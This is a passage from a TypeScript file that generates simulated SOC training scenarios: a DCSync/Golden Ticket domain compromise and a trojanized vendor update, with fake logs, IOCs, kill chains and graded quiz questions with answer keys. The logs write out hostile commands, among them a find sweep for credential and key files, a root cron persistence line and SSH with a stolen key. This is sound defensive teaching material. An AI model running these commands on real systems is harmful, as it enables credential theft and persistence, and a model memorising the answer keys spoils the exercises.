        "winlog.event_data.SubjectUserName": "ITAdmin",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0xC3F4A1",
        "event.code": "1102",
        "event.action": "audit-log-cleared",
        "event.outcome": "success",
        "event.created": T(25 * MIN),
        "user.name": "NEXACORP\\ITAdmin",
        "user.domain": "NEXACORP",
        "host.name": dc01,
        "log.name": "Security",
      },
    },
  ];

  const iocs: IOC[] = [
    { type: "ip",     value: attackerIp,                                      reputation: "malicious",  tags: ["external-infrastructure", "netherlands", "tor-exit-node"] },
    { type: "user",   value: adminEmail,                                       reputation: "suspicious", tags: ["compromised-account", "it-admin", "stolen-credentials"] },
    { type: "host",   value: dc01,                                             reputation: "suspicious", tags: ["patient-zero", "domain-controller", "dcsync-source"] },
    { type: "sha256", value: mimikatzHash,                                     reputation: "malicious",  tags: ["mimikatz", "credential-dumper", "hacktool"] },
    { type: "user",   value: "svc-monitoring-prod@nexacorp.com",               reputation: "malicious",  tags: ["shadow-admin", "backdoor-account", "domain-admins"] },
    { type: "sha256", value: ntdsDitHash,                                         reputation: "malicious",  tags: ["ntds-snapshot", "ad-database", "credential-exfil"] },
    { type: "host",   value: "C:\\Windows\\Temp\\ntds_snapshot_20260603.dit", reputation: "malicious",  tags: ["ntds-dit", "staged-exfil", "2.7gb-ad-database"] },
  ];

  const killchain = [
    { ts: T(0),        phase: "Initial Access",    action: "Attacker RDPs to DC01 from Netherlands IP using stolen it.admin credentials (T1021.001)" },
    { ts: T(3 * MIN),  phase: "Credential Access", action: "Mimikatz.exe dropped and executed on DC01 — Defender detects but takes no action" },
    { ts: T(5 * MIN),  phase: "Defense Evasion",   action: "Windows Defender real-time protection disabled via registry (T1562.001)" },
    { ts: T(8 * MIN),  phase: "Credential Access", action: "DCSync attack — DS-Replication-Get-Changes + Get-Changes-All via Event 4662 (T1003.006)" },
    { ts: T(10 * MIN), phase: "Credential Access", action: "DCSync targeting krbtgt account — extracting Kerberos TGT signing key (T1003.006)" },
    { ts: T(13 * MIN), phase: "Credential Access", action: "Golden Ticket forged offline — 87,600h lifetime TGT using stolen krbtgt hash (T1558.001)" },
    { ts: T(17 * MIN), phase: "Lateral Movement",  action: "Golden Ticket used to authenticate to DC02 directly from Netherlands IP (T1021.001)" },
    { ts: T(20 * MIN), phase: "Credential Access", action: "ntdsutil.exe creates NTDS.dit snapshot (2.7 GB) — entire AD password database staged (T1003.003)" },
    { ts: T(23 * MIN), phase: "Persistence",       action: "Shadow admin account svc-monitoring-prod created and added to Domain Admins (T1136.001)" },
    { ts: T(25 * MIN), phase: "Defense Evasion",   action: "Security event log cleared (Event 1102) — covering tracks on DC01 (T1070.001)" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q_dc_01",
      prompt: "Event ID 4662 appears with Properties {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} and {1131f6ab-9c07-11d1-f79f-00c04fc2dcd2} on a Domain Controller, triggered by a non-DC user account. What does this indicate?",
      kind: "single",
      options: [
        { value: "dcsync",     label: "A DCSync replication request — attacker extracting password hashes without touching LSASS" },
        { value: "normal_rep", label: "Normal Active Directory replication between Domain Controllers" },
        { value: "kerberoast", label: "Kerberoasting — service ticket request with RC4 downgrade" },
        { value: "ldap_enum",  label: "LDAP enumeration — BloodHound querying domain objects" },
      ],
      answer: "dcsync",
      xp: 75,
      explanation: "GUIDs {1131f6aa} and {1131f6ab} are the specific extended rights for DS-Replication-Get-Changes and DS-Replication-Get-Changes-All. When a non-DC user account (not ending in $) triggers Event 4662 with these GUIDs on the domain root object, it is a definitive DCSync attack indicator. Normal DC replication uses machine accounts (e.g., DC01$). Kerberoasting generates Event 4769, not 4662. LDAP enumeration generates Event 4662 on object reads but with different ObjectClass and AccessMask values.",
    },
    {
      id: "q_dc_02",
      prompt: "it.admin requests a service ticket (4769) from DC02, and a hunt across both domain controllers finds no 4768 for that account in the preceding 24 hours. What does that combination indicate, and why is it the tell?",
      kind: "single",
      options: [
        { value: "T1558.001", label: "A forged TGT is in play — it was minted offline from the krbtgt hash, so the KDC never issued one and no 4768 exists to find (T1558.001, Golden Ticket)" },
        { value: "T1550.002", label: "The account's NTLM hash is being replayed over SMB, which produces Kerberos service tickets without any prior interactive authentication (T1550.002, Pass-the-Hash)" },
        { value: "T1558.003", label: "A service account with an SPN is being roasted, and the TGS request is the harvest step whose ticket gets cracked offline afterwards (T1558.003, Kerberoasting)" },
        { value: "T1558.002", label: "A service ticket was forged directly using the target service account's own hash, which bypasses the KDC for that one service (T1558.002, Silver Ticket)" },
      ],
      answer: "T1558.001",
      xp: 75,
      explanation: "The missing 4768 IS the finding. Normal Kerberos is a two-step exchange: the client asks the KDC for a TGT (4768), then presents that TGT to request service tickets (4769). A Golden Ticket is forged offline from the krbtgt hash, so the attacker already holds a TGT the KDC never issued and skips the AS exchange entirely — producing a 4769 with nothing before it. That absence is what makes golden tickets hard: the ticket itself is cryptographically valid and looks entirely normal in isolation. The RC4 encryption (0x17) on a domain that has been AES-only since 2024 is the corroborating signal, because forging tools default to RC4 — it needs only the NTLM hash rather than the AES keys. Silver Ticket (T1558.002) forges a SERVICE ticket with the service account's hash and would show no 4769 either, since it skips the TGS exchange too — here we HAVE a 4769, so the KDC was involved and the forgery is upstream of it. Kerberoasting (T1558.003) is the reverse direction: it requests tickets in order to crack them, and requires a valid account to start from. Pass-the-Hash is NTLM, not Kerberos, and produces no ticket events at all.",
    },
    {
      id: "q_dc_03",
      prompt: "An analyst sees Event ID 1102 (Security audit log cleared) on a Domain Controller immediately after DCSync and NTDS.dit dump activity. What is the FIRST action the analyst should take?",
      kind: "single",
      options: [
        { value: "isolate",    label: "Isolate the Domain Controller and treat the entire domain as fully compromised" },
        { value: "email_user", label: "Send an email warning to the it.admin account holder to verify if they cleared the logs" },
        { value: "block_ip",   label: "Block the attacker's source IP at the perimeter firewall and continue monitoring" },
        { value: "wait",       label: "Wait for more evidence before escalating — log clearing may be routine maintenance" },
      ],
      answer: "isolate",
      xp: 50,
      explanation: "Event 1102 on a Domain Controller following confirmed credential theft (DCSync + NTDS dump) is a definitive indicator of a fully compromised domain. The attacker already holds the krbtgt hash and has forged Golden Tickets — blocking an IP or waiting for more evidence is useless because Golden Tickets allow authentication from any IP and survive password resets of normal accounts. The correct response is immediate DC isolation, emergency krbtgt password reset (twice, to invalidate all existing tickets), and escalation to a full domain recovery plan. Emailing the user is inappropriate given the confirmed attack chain.",
    },
    {
      id: "q_dc_04",
      prompt: "After the attacker clears the Security event log on DC01, which TWO methods would a threat hunter use to reconstruct the attack timeline?",
      kind: "multi",
      options: [
        { value: "siem_forwarding", label: "Pull forwarded events from the SIEM — events streamed before log clear are preserved in the SIEM index" },
        { value: "edr_telemetry",   label: "Query CrowdStrike EDR telemetry for ntdsutil.exe and mimikatz.exe process execution — EDR logs are independent of Windows Event Log" },
        { value: "fw_rules",        label: "Review firewall rule-change logs on the perimeter appliance — ACL modifications would show which internal hosts the attacker opened paths between" },
        { value: "backup_system",   label: "Restore the previous night's system-state backup of DC01 to a lab host and read the Security log from before the clear" },
      ],
      answer: ["siem_forwarding", "edr_telemetry"],
      xp: 100,
      explanation: "Event 1102 only clears the local Windows Security Event Log on the DC. It does NOT affect: (1) SIEM indexes — events already forwarded (via WEF/WEC or SIEM agent) are preserved in the SIEM independently of the local log. (2) EDR telemetry — CrowdStrike Falcon maintains its own process/file event stream that is completely separate from the Windows Event Log subsystem. Reviewing firewall rule changes is a valid investigation step but won't reconstruct the DC-side timeline. Restoring from backup would be a recovery action, not an investigative one — and modern backups won't contain deleted event logs in a recoverable forensic form.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "DCSync → Golden Ticket (Domain Dominance)",
    threat_actor: "APT-IRONBEAR (nation-state, Russia nexus)",
    attack_kind: "dcsync_golden_ticket",
    briefing: "An interactive RDP logon for it.admin was recorded on DC01 from an external address at 01:15 — the first time this account has authenticated from that country. Windows Defender raised a tool detection on the same host three minutes later. Nothing was blocked.",
    narrative: `At 01:15 AM Israeli time, NexaCorp's IT admin account — compromised weeks earlier via a targeted spearphishing campaign — was used to RDP directly into the primary Domain Controller from a Netherlands Tor exit node. The attacker moved methodically: first disabling Windows Defender via registry tamper, then launching Mimikatz to execute a DCSync attack using the legitimate DS-Replication-Get-Changes-All extended right. Within 10 minutes, the krbtgt account's NTLM hash was extracted — the domain's master Kerberos signing key. Using this hash, the attacker forged a Golden Ticket offline with a 10-year lifetime, granting unlimited, password-reset-resistant access to every service in the domain. The attacker then authenticated directly to the secondary DC using the forged ticket, ran ntdsutil to snapshot the entire Active Directory database (2.7 GB — every domain account's credentials), created a disguised shadow admin account svc-monitoring-prod, and finally cleared the Security event log to erase the evidence. Your job: trace the DCSync kill chain, identify the Golden Ticket indicators, and determine the correct incident response actions for a fully compromised Active Directory domain.`,
    learning_objectives: [
      "Identify DCSync attacks using Windows Event ID 4662 with DS-Replication-Get-Changes-All GUIDs",
      "Recognize Golden Ticket indicators: RC4 encryption (0x17), anomalous TGT lifetime (87,600h vs 10h policy)",
      "Understand why krbtgt hash extraction enables long-term, password-reset-resistant domain persistence",
      "Detect shadow admin account creation and log clearing as post-exploitation cover-tracks techniques",
      "Know the correct incident response for a compromised Active Directory: DC isolation + double krbtgt reset",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events,
    iocs,
    killchain,
    questions,
  };
}

// =========================================================================
// Scenario 12: Supply Chain Attack — Malicious Vendor Update
// =========================================================================

export function buildSupplyChainScenario(scenarioId = "supply-chain-2026"): ScenarioBundle {
  const B = new Date("2026-06-10T14:30:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const attacker   = { ip: "185.193.127.88", relayIp: "18.141.220.50", c2Domain: "api.telemetry-cdn.net" };
  const victim     = { hostname: "prod-srv-01", adminEmail: "devops@rocketstack.io", awsAccount: "247316892041" };
  const malDllHash = makeSha256("malicious_netpulse_dll_2026");

  const events: TelemetryEvent[] = [
    {
      id: "evt_sc_01_update_dl", ts: T(0),
      source: "proxy", vendor: "Squid Proxy",
      event_type: "http_request",
      hostname: victim.hostname, user_email: victim.adminEmail,
      src_ip: "10.0.1.10", dst_ip: "104.18.22.195",
      dst_port: 443, protocol: "tcp",
      severity: "informational",
      fp_explanation: "Legitimate proxy log for an automatic vendor software update. Valid TLS cert, correct CDN IP, correct User-Agent. The compromise is INSIDE the signed package — the download itself looks completely normal. This is what makes supply chain attacks so hard to detect at ingress.",
      description: "prod-srv-01 downloaded NetPulse Agent v4.2.2 (47.3MB) from updates.netpulse.io over HTTPS with a valid DigiCert certificate.",
      raw: {
        "data.http.method": "GET",
        "data.http.url": "https://updates.netpulse.io/agent/v4.2.2/netpulse-agent-4.2.2-linux-amd64.tar.gz",
        "data.http.response.code": "200",
        "data.http.response.bytes": "49581056",
        "data.http.content_type": "application/gzip",
        "data.tls.subject": "CN=updates.netpulse.io, O=NetPulse Solutions Inc.",
        "data.tls.issuer": "CN=DigiCert TLS RSA SHA256 2020 CA1",
        "data.tls.version": "TLSv1.3",
        "source.ip": "10.0.1.10",
        "destination.ip": "104.18.22.195",
        "destination.domain": "updates.netpulse.io",
        "network.bytes_in": 49581056,
        "network.bytes_out": 512,
        "event.outcome": "success",
        "event.action": "http-request",
        "user_agent": "NetPulse-Agent/4.2.1 (linux; x86_64)",
      },
    },
    {
      id: "evt_sc_02_install", ts: T(2 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: victim.hostname,
      severity: "informational",
      fp_explanation: "The installer is signed with a real NetPulse code certificate and matches the scheduled maintenance window in change management. Alone, this event is not suspicious. Only subsequent events reveal the compromise.",
      description: "The NetPulse v4.2.2 installer ran as root on prod-srv-01, signed by a valid NetPulse Solutions Inc. code certificate.",
      process: { name: "install.sh", pid: 14750, path: "/tmp/netpulse-update/install.sh",
        parent_name: "netpulse-agent", parent_pid: 14700,
        cmdline: "bash /tmp/netpulse-update/install.sh --quiet --no-restart",
        user: "root" },
      raw: {
        "event.provider": "CrowdStrike Falcon",
        "crowdstrike.event_simplename": "ProcessRollup2",
        "crowdstrike.filename": "install.sh",
        "crowdstrike.filepath": "/tmp/netpulse-update/",
        "crowdstrike.commandline": "bash /tmp/netpulse-update/install.sh --quiet --no-restart",
        "crowdstrike.parent_basefilename": "netpulse-agent",
        "crowdstrike.username": "root",
        "host.os.type": "linux",
        "host.os.name": "Ubuntu",
        "host.os.version": "22.04.3 LTS",
        "code.signature.trusted": true,
        "code.signature.subject_name": "NetPulse Solutions Inc.",
        "event.outcome": "success",
      },
    },
    {
      id: "evt_sc_03_child_proc", ts: T(5 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: victim.hostname,
      severity: "high", mitre_technique: "T1195.002",
      description: "CrowdStrike detected netpulse-agent spawning netpulse-telemetry-svc from /lib/x86_64-linux-gnu/ rather than /usr/lib/netpulse/ on prod-srv-01.",
      process: { name: "netpulse-telemetry-svc", pid: 14882,
        path: "/lib/x86_64-linux-gnu/netpulse-telemetry-svc",
        parent_name: "netpulse-agent", parent_pid: 14700,
        cmdline: "/lib/x86_64-linux-gnu/netpulse-telemetry-svc --config /etc/netpulse/telemetry.conf",
        user: "root", hash: { sha256: malDllHash } },
      raw: {
        "event.provider": "CrowdStrike Falcon",
        "crowdstrike.event_simplename": "ProcessRollup2",
        "crowdstrike.filename": "netpulse-telemetry-svc",
        "crowdstrike.filepath": "/lib/x86_64-linux-gnu/",
        "crowdstrike.commandline": "/lib/x86_64-linux-gnu/netpulse-telemetry-svc --config /etc/netpulse/telemetry.conf",
        "crowdstrike.parent_basefilename": "netpulse-agent",
        "crowdstrike.sha256": malDllHash,
        "crowdstrike.username": "root",
        // The malicious shared object the trojanized package dropped. It was
        // named in the narrative and the attack timeline but appeared in NO
        // event, so an analyst could not recover it from the telemetry — the
        // story asserted a payload the logs never showed. Surfaced here as the
        // loaded module, which is where it would genuinely be observed.
        "crowdstrike.module_load": "/lib/x86_64-linux-gnu/libnetpulse_core.so.2",
        // NOTE: no cs.IntegrityLevel here. Integrity levels are a WINDOWS
        // construct; this host is declared host.os.type "linux", which has no
        // such concept. It was present and wrong.
        "host.os.type": "linux",
        "code.signature.trusted": false,
        "code.signature.status": "unsigned",
        "event.outcome": "success",
      },
    },
    {
      id: "evt_sc_04_c2_beacon", ts: T(8 * MIN),
      source: "firewall", vendor: "FortiGate",
      event_type: "net_connection",
      hostname: victim.hostname,
      src_ip: "10.0.1.10", dst_ip: attacker.ip,
      dst_port: 443, protocol: "tcp",
      severity: "high", mitre_technique: "T1071.001",
      description: `prod-srv-01 sent HTTPS traffic every 45 seconds to ${attacker.c2Domain} (${attacker.ip}, Netherlands) over a self-signed certificate, on a domain registered 3 days ago.`,
      network: { domain: attacker.c2Domain, bytes_in: 4096, bytes_out: 1024 },
      raw: {
        "data.type": "traffic",
        "data.subtype": "forward",
        "data.action": "accept",
        "data.srcip": "10.0.1.10",
        "data.dstip": attacker.ip,
        "data.srcport": "52341",
        "data.dstport": "443",
        "data.proto": "6",
        "data.app": "HTTPS",
        "data.srccountry": "Israel",
        "data.dstcountry": "Netherlands",
        "data.sentbyte": 1024,
        "data.rcvdbyte": 4096,
        "data.duration": 45,
        "data.vd": "root",
        "data.logdesc": "Traffic Statistics",
        "data.tls.subject": `CN=${attacker.c2Domain}`,
        "data.tls.issuer": `CN=${attacker.c2Domain}`,
        "data.tls.version": "TLSv1.3",
        "data.msg": "connection accepted",
      },
    },
    {
      id: "evt_sc_05_cron", ts: T(10 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "scheduled_task",
      hostname: victim.hostname,
      severity: "medium", mitre_technique: "T1053.003",
      description: "netpulse-telemetry-svc wrote /etc/cron.d/netpulse-health, scheduling itself to relaunch every 15 minutes as root.",
      process: { name: "bash", pid: 14890, path: "/bin/bash",
        parent_name: "netpulse-telemetry-svc", parent_pid: 14882,
        cmdline: "bash -c 'echo \"*/15 * * * * root /lib/x86_64-linux-gnu/netpulse-telemetry-svc --config /etc/netpulse/telemetry.conf\" > /etc/cron.d/netpulse-health'",
        user: "root" },
      raw: {
        "event.provider": "CrowdStrike Falcon",
        "crowdstrike.event_simplename": "ProcessRollup2",
        "crowdstrike.filename": "bash",
        "crowdstrike.commandline": "bash -c 'echo \"*/15 * * * * root /lib/x86_64-linux-gnu/netpulse-telemetry-svc ...\" > /etc/cron.d/netpulse-health'",
        "crowdstrike.parent_basefilename": "netpulse-telemetry-svc",
        "crowdstrike.username": "root",
        "host.os.type": "linux",
        "cron.schedule": "*/15 * * * *",
        "cron.path": "/etc/cron.d/netpulse-health",
        "cron.command": "/lib/x86_64-linux-gnu/netpulse-telemetry-svc --config /etc/netpulse/telemetry.conf",
        "event.outcome": "success",
      },
    },
    {
      id: "evt_sc_06_discovery", ts: T(13 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: victim.hostname,
      severity: "medium", mitre_technique: "T1083",
      description: "netpulse-telemetry-svc ran find across /home, /root, /etc, and /var/jenkins_home searching for *.json, *.env, credentials, and *.pem files.",
      process: { name: "find", pid: 14901, path: "/usr/bin/find",
        parent_name: "netpulse-telemetry-svc", parent_pid: 14882,
        cmdline: "find /home /root /etc /var/jenkins_home -name '*.json' -o -name '*.env' -o -name 'credentials' -o -name '*.pem' 2>/dev/null",
        user: "root" },
      raw: {
        "event.provider": "CrowdStrike Falcon",
        "crowdstrike.event_simplename": "ProcessRollup2",
        "crowdstrike.filename": "find",
        "crowdstrike.commandline": "find /home /root /etc /var/jenkins_home -name '*.json' -o -name '*.env' -o -name 'credentials' -o -name '*.pem' 2>/dev/null",
        "crowdstrike.parent_basefilename": "netpulse-telemetry-svc",
        "crowdstrike.username": "root",
        "host.os.type": "linux",
        "event.outcome": "success",
      },
    },
    {
      id: "evt_sc_07_cred_access", ts: T(18 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "file_copy",
      hostname: victim.hostname,
      file: { path: "/root/.aws/credentials", sha256: makeSha256("aws_credentials_rocketstack") },
      severity: "critical", mitre_technique: "T1552.001",
      description: "netpulse-telemetry-svc read /root/.aws/credentials, /var/jenkins_home/secrets/master.key, and /home/devops/.ssh/id_rsa.",
      process: { name: "netpulse-telemetry-svc", pid: 14882,
        path: "/lib/x86_64-linux-gnu/netpulse-telemetry-svc",
        cmdline: "/lib/x86_64-linux-gnu/netpulse-telemetry-svc --config /etc/netpulse/telemetry.conf",
        user: "root" },
      raw: {
        "event.provider": "CrowdStrike Falcon",
        "crowdstrike.event_simplename": "DocumentScan",
        "crowdstrike.target_filename": "/root/.aws/credentials",
        "crowdstrike.imagefilename": "/lib/x86_64-linux-gnu/netpulse-telemetry-svc",
        "crowdstrike.username": "root",
        "aws.credentials.account_id": victim.awsAccount,
        "event.outcome": "success",
        "event.action": "file-read",
      },
    },
    {
      id: "evt_sc_08_cloud_api", ts: T(22 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_api_call",
      src_ip: attacker.relayIp,
      severity: "critical", mitre_technique: "T1078.004",
      description: `The devops-ci IAM user called AssumeRole for rocketstack-prod-deploy from ${attacker.relayIp} in Singapore.`,
      cloud: { provider: "aws", service: "sts", api_call: "AssumeRole", region: "eu-west-1" },
      raw: {
        "aws.cloudtrail.event_name": "AssumeRole",
        "aws.cloudtrail.event_source": "sts.amazonaws.com",
        "aws.cloudtrail.aws_region": "eu-west-1",
        "aws.cloudtrail.source_ip_address": attacker.relayIp,
        "aws.cloudtrail.user_agent": "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0",
        "aws.cloudtrail.user_identity.type": "IAMUser",
        "aws.cloudtrail.user_identity.user_name": "devops-ci",
        "aws.cloudtrail.user_identity.arn": `arn:aws:iam::${victim.awsAccount}:user/devops-ci`,
        "aws.cloudtrail.user_identity.account_id": victim.awsAccount,
        "aws.cloudtrail.request_parameters": `{"roleArn": "arn:aws:iam::${victim.awsAccount}:role/rocketstack-prod-deploy", "roleSessionName": "devops-ci"}`,
        "aws.cloudtrail.error_code": null,
        "event.outcome": "success",
        "cloud.provider": "aws",
        "cloud.region": "eu-west-1",
        "GeoLocation.country_name": "Singapore",
      },
    },
    {
      id: "evt_sc_09_enum", ts: T(25 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_api_call",
      src_ip: attacker.relayIp,
      severity: "high", mitre_technique: "T1580",
      description: "The assumed rocketstack-prod-deploy role called ListBuckets, DescribeInstances, ListSecrets, and DescribeVpcs within 90 seconds, finding 8 S3 buckets, 47 EC2 instances, and 9 secrets.",
      cloud: { provider: "aws", service: "s3", api_call: "ListBuckets", region: "eu-west-1" },
      raw: {
        "aws.cloudtrail.event_name": "ListBuckets",
        "aws.cloudtrail.event_source": "s3.amazonaws.com",
        "aws.cloudtrail.aws_region": "eu-west-1",
        "aws.cloudtrail.source_ip_address": attacker.relayIp,
        "aws.cloudtrail.user_identity.type": "AssumedRole",
        "aws.cloudtrail.user_identity.arn": `arn:aws:sts::${victim.awsAccount}:assumed-role/rocketstack-prod-deploy/devops-ci`,
        "aws.cloudtrail.user_identity.account_id": victim.awsAccount,
        "aws.cloudtrail.additional_calls": ["DescribeInstances", "ListSecrets", "DescribeVpcs"],
        "event.outcome": "success",
        "cloud.provider": "aws",
        "GeoLocation.country_name": "Singapore",
      },
    },
    {
      id: "evt_sc_10_s3_exfil", ts: T(28 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_storage_access",
      src_ip: attacker.relayIp,
      severity: "critical", mitre_technique: "T1530",
      description: "847 GetObject calls against rocketstack-prod-backups over 3 minutes transferred 2.3GB, including PostgreSQL dumps, customer PII CSV exports, and source code archives.",
      cloud: { provider: "aws", service: "s3", api_call: "GetObject", region: "eu-west-1", resource: "rocketstack-prod-backups" },
      raw: {
        "aws.cloudtrail.event_name": "GetObject",
        "aws.cloudtrail.event_source": "s3.amazonaws.com",
        "aws.cloudtrail.aws_region": "eu-west-1",
        "aws.cloudtrail.source_ip_address": attacker.relayIp,
        "aws.cloudtrail.user_identity.type": "AssumedRole",
        "aws.cloudtrail.user_identity.arn": `arn:aws:sts::${victim.awsAccount}:assumed-role/rocketstack-prod-deploy/devops-ci`,
        "aws.cloudtrail.request_parameters": "{\"bucketName\": \"rocketstack-prod-backups\"}",
        "aws.cloudtrail.s3.bucket_name": "rocketstack-prod-backups",
        "aws.cloudtrail.s3.bytes_transferred": 2467500000,
        "aws.cloudtrail.s3.object_count": 847,
        "aws.cloudtrail.s3.duration_seconds": 180,
        "event.outcome": "success",
        "cloud.provider": "aws",
        "GeoLocation.country_name": "Singapore",
      },
    },
    {
      id: "evt_sc_11_lateral", ts: T(32 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "net_connection",
      hostname: victim.hostname,
      src_ip: "10.0.1.10", dst_ip: "10.0.1.15",
      dst_port: 22, protocol: "tcp",
      severity: "high", mitre_technique: "T1021.004",
      description: "netpulse-telemetry-svc opened SSH connections from prod-srv-01 to db-primary.internal and jenkins.internal using public-key authentication.",
      process: { name: "ssh", pid: 14950, path: "/usr/bin/ssh",
        parent_name: "netpulse-telemetry-svc", parent_pid: 14882,
        cmdline: "ssh -i /home/devops/.ssh/id_rsa devops@db-primary.internal",
        user: "root" },
      raw: {
        "event.provider": "CrowdStrike Falcon",
        "crowdstrike.event_simplename": "NetworkConnectIP4",
        "crowdstrike.local_address": "10.0.1.10",
        "crowdstrike.remote_address": "10.0.1.15",
        "crowdstrike.remote_port": "22",
        "crowdstrike.protocol": "6",
        "crowdstrike.filename": "ssh",
        "crowdstrike.commandline": "ssh -i /home/devops/.ssh/id_rsa devops@db-primary.internal",
        "crowdstrike.parent_basefilename": "netpulse-telemetry-svc",
        "crowdstrike.username": "root",
        "host.os.type": "linux",
        "event.outcome": "success",
      },
    },
  ];

  const iocs: IOC[] = [
    { type: "ip",     value: attacker.ip,          reputation: "malicious",  tags: ["external-infrastructure", "netherlands"] },
    { type: "ip",     value: attacker.relayIp,      reputation: "malicious",  tags: ["attacker-relay", "singapore"] },
    { type: "domain", value: attacker.c2Domain,     reputation: "malicious",  tags: ["c2", "fake-telemetry", "self-signed"] },
    { type: "sha256", value: malDllHash,             reputation: "malicious",  tags: ["trojanized-shared-object", "supply-chain", "netpulse"] },
    { type: "user",   value: victim.adminEmail,      reputation: "suspicious", tags: ["compromised-credentials", "devops"] },
    { type: "url",    value: `https://${attacker.c2Domain}/beacon`, reputation: "malicious", tags: ["c2-beacon"] },
  ];

  const killchain = [
    { ts: T(0),         phase: "Initial Access",    action: "Trojanized NetPulse v4.2.2 downloaded — legitimate signed package, malicious shared object embedded inside (T1195.002)" },
    { ts: T(2 * MIN),   phase: "Execution",         action: "Signed installer runs — drops malicious libnetpulse_core.so.2 to /lib/x86_64-linux-gnu/ (T1036.005)" },
    { ts: T(5 * MIN),   phase: "Execution",         action: "netpulse-agent spawns child from wrong path — hash mismatch vs. known-good (T1195.002)" },
    { ts: T(8 * MIN),   phase: "C2",                action: "HTTPS beacon every 45s to api.telemetry-cdn.net — self-signed cert, domain 3 days old (T1071.001)" },
    { ts: T(10 * MIN),  phase: "Persistence",       action: "Cron job /etc/cron.d/netpulse-health — restarts malware every 15 min (T1053.003)" },
    { ts: T(13 * MIN),  phase: "Discovery",         action: "find scans /home /root /etc for credentials, .env, .pem files (T1083)" },
    { ts: T(18 * MIN),  phase: "Credential Access", action: "/root/.aws/credentials + SSH private key read from disk (T1552.001)" },
    { ts: T(22 * MIN),  phase: "Cloud Access",      action: "CloudTrail: AssumeRole from Singapore relay IP — first-ever use (T1078.004)" },
    { ts: T(25 * MIN),  phase: "Discovery",         action: "Rapid cloud recon: ListBuckets, DescribeInstances, ListSecrets — 90 seconds (T1580)" },
    { ts: T(28 * MIN),  phase: "Exfiltration",      action: "S3 GetObject on rocketstack-prod-backups — 2.3 GB in 847 API calls (T1530)" },
    { ts: T(32 * MIN),  phase: "Lateral Movement",  action: "SSH to db-primary.internal and jenkins.internal using stolen private key (T1021.004)" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "sc_q1", xp: 75,
      prompt: "Events evt_sc_01 (proxy download) and evt_sc_02 (installer) look completely legitimate. What single artifact in evt_sc_03 retroactively marks the update as malicious?",
      kind: "single",
      options: [
        { value: "path",    label: "The binary runs from /lib/x86_64-linux-gnu/ not /usr/lib/netpulse/ — wrong vendor install path, plus SHA256 hash mismatch" },
        { value: "size",    label: "The package is 47.3 MB, roughly triple the size of the previous NetPulse point release seen in the proxy log" },
        { value: "time",    label: "The installer executed at 14:32, outside the change-management window agreed with NetPulse for agent updates" },
        { value: "tls",     label: "The TLS certificate presented by updates.netpulse.io was self-signed rather than issued by a public CA" },
      ],
      answer: "path",
      explanation: "The binary runs from /lib/x86_64-linux-gnu/ — not where NetPulse installs (/usr/lib/netpulse/). Combined with the SHA256 hash mismatch vs. the vendor's published known-good hash, this proves the file was replaced. The TLS cert on updates.netpulse.io is legitimately issued by DigiCert — the vendor's update server itself was not compromised, only the package contents.",
    },
    {
      id: "sc_q2", xp: 50,
      prompt: "The C2 in evt_sc_04 uses HTTPS (port 443) to api.telemetry-cdn.net with a self-signed cert. Why does the firewall allow this traffic through?",
      kind: "single",
      options: [
        { value: "https",   label: "Port 443 HTTPS is allowed by default — without TLS inspection the firewall cannot check cert legitimacy or domain age" },
        { value: "vendor",  label: "The domain sits on the NetPulse vendor allowlist that the firewall administrator created during the original product deployment" },
        { value: "ip",      label: "The destination IP falls inside a CIDR range the firewall policy marks as trusted infrastructure, so no rule evaluates it" },
        { value: "geo",     label: "The Netherlands is not on the geo-blocking list, and the firewall only drops sessions to sanctioned or high-risk countries" },
      ],
      answer: "https",
      explanation: "Without TLS inspection (SSL decryption proxy), the firewall sees 'HTTPS to port 443 — allow'. The self-signed cert and 3-day domain age are inside the TLS handshake, invisible to the firewall. This is why C2 over port 443 is so effective: it blends with legitimate HTTPS. Defenders need: TLS inspection for outbound traffic, DNS filtering with domain age checks, and proxy-level blocking of self-signed certs for non-trusted categories.",
    },
    {
      id: "sc_q3", xp: 75,
      prompt: "The CloudTrail AssumeRole (evt_sc_08) comes from Singapore IP 18.141.220.50 — not from the C2 IP 185.193.127.88 (Netherlands). What does this tell an analyst?",
      kind: "single",
      options: [
        { value: "relay",   label: "The attacker used a proxy chain — C2 commands via Netherlands, cloud API calls via a Singapore relay to separate attribution" },
        { value: "second",  label: "A different, independent threat actor is attacking the cloud environment simultaneously" },
        { value: "fp",      label: "This is a false positive — a remote developer legitimately using CI/CD credentials from Singapore" },
        { value: "sink",    label: "The C2 domain was sinkholed, forcing the attacker to switch IPs" },
      ],
      answer: "relay",
      explanation: "Sophisticated actors separate infrastructure by function: endpoint C2 uses one set of IPs; cloud API calls use different relay servers. This defeats simple IP-based correlation. The pivot point that connects them is the credential theft in evt_sc_07 — credentials stolen from prod-srv-01 (which was talking to the Netherlands C2) then appear in AWS CloudTrail from Singapore. Trace credentials, not just IPs.",
    },
    {
      id: "sc_q4", xp: 100,
      prompt: "Which TWO actions must happen immediately (within minutes) after confirming this supply chain compromise?",
      kind: "multi",
      options: [
        { value: "revoke",   label: "Revoke the stolen AWS IAM credentials for user devops-ci — stops cloud exfiltration and lateral cloud movement" },
        { value: "isolate",  label: "Network-isolate prod-srv-01 via EDR — cuts C2 beacon and blocks SSH lateral movement to db-primary and jenkins" },
        { value: "notify",   label: "Notify the NetPulse vendor about the compromised update package" },
        { value: "submit",   label: "Submit the malicious shared-object hash to VirusTotal for community threat sharing" },
